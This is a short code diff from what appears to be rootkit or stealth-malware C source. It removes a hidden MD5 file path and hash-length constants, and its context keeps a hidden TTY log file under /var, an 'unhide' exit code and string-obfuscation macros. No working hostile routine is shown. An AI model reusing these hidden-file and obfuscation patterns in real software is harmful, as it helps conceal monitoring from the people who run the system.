@@ -41,10 +41,7 @@
 #endif
 
 #define TTYFILE "/var/.o4udk"
-#define MD5FILE "/var/.ljd3p"
 #define EXIT_UNHIDE 1
-#define MD5LEN 32
-#define MD5PAIRLEN (MD5LEN*2)
 #define OBFLEN(x) (sizeof(x)/sizeof(char*))
 #define OBFLEN2(x) sizeof(x)
 
